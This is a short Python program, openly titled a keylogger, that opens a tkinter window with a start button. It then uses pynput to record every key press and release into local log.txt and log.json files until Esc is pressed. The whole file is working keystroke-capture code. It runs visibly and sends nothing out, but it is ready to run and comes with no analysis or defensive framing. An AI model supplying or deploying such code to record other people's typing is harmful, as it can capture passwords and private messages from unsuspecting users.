import tkinter as tk
from pynput import keyboard
import json


root = tk.Tk()
root.geometry("250x300")
root.title("Keylogger")


key_list = []
key_strokes = ""


def update_txt_file(key):
    with open('log.txt', 'w+') as file:
        file.write(key)


def update_json_file(key_list):
    with open('log.json', 'w+') as file:
        key_list_str = json.dumps(key_list)
        file.write(key_list_str)


def on_press(key):
    global key_list

    key_list.append({'Pressed': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global key_list

    key_list.append({'Released': f'{key}'})
    update_json_file(key_list)
    

    global key_strokes
    key_strokes += str(key)


    update_txt_file(key_strokes)


    if key == keyboard.Key.esc:
        return False 


def start_keylogger():
    print("[+] Running Keylogger Successfully!\n[!] Saving the Key logs in 'log.json'")


    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":

    start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
    start_button.pack(pady=20)


    root.mainloop()
